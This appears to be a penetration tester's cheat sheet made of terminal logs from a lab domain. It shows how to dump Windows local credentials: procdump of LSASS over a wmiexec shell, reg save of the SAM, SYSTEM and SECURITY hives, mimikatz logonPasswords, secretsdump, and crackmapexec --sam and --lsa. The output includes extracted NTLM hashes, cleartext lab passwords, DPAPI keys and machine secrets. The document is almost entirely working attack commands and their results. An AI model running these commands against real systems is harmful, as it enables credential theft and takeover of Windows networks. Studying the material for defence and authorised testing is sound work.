=================================================================================================================================================
Dumping Windows credentials (local password hashes)
=================================================================================================================================================

The objective is to extract the password hashes stored in the registry hives (SAM, SYSTEM, SECURITY) and the passwords and password hashes 
stored in the memory of the LSASS process. 
A valid local or domain Windows account member of the 'local administrator' group is required for dumping "local" credentials.


=================================================================================================================================================
Example 1. Dumping local Windows password hashes
   => Targets: registry hives (SAM, SYSTEM, SECURITY), LSA secrets
   => Tools: WMIexec + REG SAVE + Secretsdump + ProcDump + Mimikatz 
=================================================================================================================================================

=> A valid local or domain Windows account member of the 'local administrator' group is required for dumping "local" passwords
 
jeff@kali:~/Documents/Tools/Sysinternals$ wmiexec.py Qualys@192.168.1.50
Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation
Password:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>cd temp

C:\temp>put procdump64.exe
[*] Uploading procdump64.exe to C:\temp\procdump64.exe

C:\temp>procdump64.exe -accepteula -ma lsass.exe lsassdump.dmp

ProcDump v9.0 - Sysinternals process dump utility
Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[22:56:50] Dump 1 initiated: C:\temp\lsassdump.dmp
[22:56:50] Dump 1 writing: Estimated dump file size is 100 MB.
[22:56:50] Dump 1 complete: 100 MB written in 0.1 seconds
[22:56:50] Dump count reached.

C:\temp>get lsassdump.dmp
[*] Downloading C:\\temp\lsassdump.dmp

C:\temp>reg SAVE HKLM\SAM C:\temp\sam.hive
The operation completed successfully.

C:\temp>reg SAVE HKLM\SYSTEM C:\temp\system.hive
The operation completed successfully.

C:\temp> reg SAVE HKLM\SECURITY C:\temp\security.hive
The operation completed successfully.

C:\temp>get sam.hive
[*] Downloading C:\\temp\sam.hive

C:\temp>get security.hive
[*] Downloading C:\\temp\security.hive

C:\temp>get system.hive
[*] Downloading C:\\temp\system.hive

C:\temp>

-----------------------------------

PS C:\temp> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Mar  8 2020 18:30:37
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # 

mimikatz # sekurlsa::minidump lsassdump.dmp
Switch to MINIDUMP : 'lsassdump.dmp'

mimikatz # sekurlsa::logonPasswords
Opening : 'lsassdump.dmp' file for minidump...

Authentication Id : 0 ; 183453 (00000000:0002cc9d)
Session           : Interactive from 1
User Name         : Administrator
Domain            : SECURITY-LAB
Logon Server      : TEMP-DC
Logon Time        : 4/17/2020 10:31:41 PM
SID               : S-1-5-21-3698357007-189532211-3203426890-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SECURITY-LAB
         * NTLM     : a134f40245c97f246e054cd56207eb28
         * SHA1     : 0e8ab5d5470221cc25a1198ed56fdf7720c7ef4a
         [00010000] CredentialKeys
         * NTLM     : a134f40245c97f246e054cd56207eb28
         * SHA1     : 0e8ab5d5470221cc25a1198ed56fdf7720c7ef4a
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : SECURITY-LAB
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : SECURITY-TEST-LAB.LOCAL
         * Password : (null)
        ssp :   KO
        credman :
         [00000000]
         * Username : SECURITY-LAB\backup
         * Domain   : SECURITY-LAB\backup
         * Password : Test1234
<SNIP>

-----------------------------------

jeff@kali:~/Documents/CTFs/BadBlood$ secretsdump.py -sam ./sam.hive -security ./security.hive -system ./system.hive LOCAL

Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x941140bd825386b732031d5c5b01ae8a

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1d6fcbd306077d663e23775e55b3f2e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:5ea4362d9395d858877c59ddf0cc0d2ae4961b4fc3755e6cf656a0f41cd9f28bbe7b66329fafc9dbb4962952cbfc1e2d53ddf91fb63463af3b18b8b73ec0bb3f430cf7004b704f4a4f4c674ee6fdedc426b0e8183f15b048fefec80547d1fc324007092c7bcd5271da58f9c9f0b6623ff438d6c6f2bff0a1193ed6c128153e5804f132d8347b1aa85f8306885db77adcf0145cbb641fbac93ec325eba823f00c1cd197785d96fab5f4d1c15cbcd74aa45c2ed9b52e224676fc0d9d8d5d3b5019fb2006188392680be6d674ad203969a46502bcdc9aa940c5214cf43fe3ea02aa53add798b9d747871dd269fe334159c1
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:540ddc43f8c664881760a1259f3fb021

[*] DefaultPassword 
(Unknown User):ROOT#123

[*] DPAPI_SYSTEM 
dpapi_machinekey:0x3bef35d8b9ddf267aac8ed41ce41c1a9d9d59382
dpapi_userkey:0x931d191734e96d32cab6f3a0950e0d30204b5377
[*] NL$KM 
 0000   08 26 6A A5 52 EB F1 C3  BF 0E 76 5C B4 C9 C8 1A   .&j.R.....v\....
 0010   E7 57 D5 64 4D 75 CD 0E  41 64 D3 00 B7 B7 F2 DA   .W.dMu..Ad......
 0020   77 1C 3B E0 F5 7E B1 FF  2C 9B 8D 8B 6A 8A 8D 0A   w.;..~..,...j...
 0030   E2 46 DA 0D CA E7 A7 AE  79 B1 35 19 7E D1 E7 F2   .F......y.5.~...
NL$KM:08266aa552ebf1c3bf0e765cb4c9c81ae757d5644d75cd0e4164d300b7b7f2da771c3be0f57eb1ff2c9b8d8b6a8a8d0ae246da0dcae7a7ae79b135197ed1e7f2
[*] Cleaning up... 


=================================================================================================================================================
Example 2. Dumping remotely local password hashes
   => Targets: registry hives (SAM, SYSTEM, SECURITY), LSA secrets
   => Tools: CrackMapExec (it uses secretsdump)   
=================================================================================================================================================

1. Dump remotely local password hashes
----------------------------------------
jeff@kali:~$ crackmapexec smb 192.168.1.50 -u Administrator -p Test123456 --sam
SMB         192.168.1.50    445    TEMP-DC          [*] Windows Server 2012 R2 Standard 9600 x64 (name:TEMP-DC) (domain:SECURITY-LAB) (signing:True) (SMBv1:True)
SMB         192.168.1.50    445    TEMP-DC          [+] SECURITY-LAB\Administrator:Test123456 (Pwn3d!)
SMB         192.168.1.50    445    TEMP-DC          [+] Dumping SAM hashes
SMB         192.168.1.50    445    TEMP-DC          Administrator:500:aad3b435b51404eeaad3b435b51404ee:1d6fcbd306077d663e23775e55b3f2e5:::
SMB         192.168.1.50    445    TEMP-DC          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.1.50    445    TEMP-DC          [+] Added 2 SAM hashes to the database


2. Dump remotely LSA secrets
------------------------------
jeff@kali:~$ crackmapexec smb 192.168.1.50 -u Administrator -p Test123456 --lsa
SMB         192.168.1.50    445    TEMP-DC          [*] Windows Server 2012 R2 Standard 9600 x64 (name:TEMP-DC) (domain:SECURITY-LAB) (signing:True) (SMBv1:True)
SMB         192.168.1.50    445    TEMP-DC          [+] SECURITY-LAB\Administrator:Test123456 (Pwn3d!)
SMB         192.168.1.50    445    TEMP-DC          [+] Dumping LSA secrets
SMB         192.168.1.50    445    TEMP-DC          SECURITY-LAB\TEMP-DC$:aes256-cts-hmac-sha1-96:a51fe9e4a962fed040052e2b86930b9f1ba347b2ba8f5288c8bf00e11f3dd108
SMB         192.168.1.50    445    TEMP-DC          SECURITY-LAB\TEMP-DC$:aes128-cts-hmac-sha1-96:d7822113cadddb7725d5a22798115e69
SMB         192.168.1.50    445    TEMP-DC          SECURITY-LAB\TEMP-DC$:des-cbc-md5:e5bc859dfef1c1c1
SMB         192.168.1.50    445    TEMP-DC          SECURITY-LAB\TEMP-DC$:aad3b435b51404eeaad3b435b51404ee:2867a2a9eaed3d2e20011a0f3e4fd9cc:::
SMB         192.168.1.50    445    TEMP-DC          (Unknown User):ROOT#123
SMB         192.168.1.50    445    TEMP-DC          dpapi_machinekey:0x3bef35d8b9ddf267aac8ed41ce41c1a9d9d59382
                                                    dpapi_userkey:0x931d191734e96d32cab6f3a0950e0d30204b5377
SMB         192.168.1.50    445    TEMP-DC          NL$KM:08266aa552ebf1c3bf0e765cb4c9c81ae757d5644d75cd0e4164d300b7b7f2da771c3be0f57eb1ff2c9b8d8b6a8a8d0ae246da0dcae7a7ae79b135197ed1e7f2
SMB         192.168.1.50    445    TEMP-DC          [+] Dumped 7 LSA secrets to /home/jeff/.cme/logs/TEMP-DC_192.168.1.50_2020-04-14_191531.lsa and /home/jeff/.cme/logs/TEMP-DC_192.168.1.50_2020-04-14_191531.cached


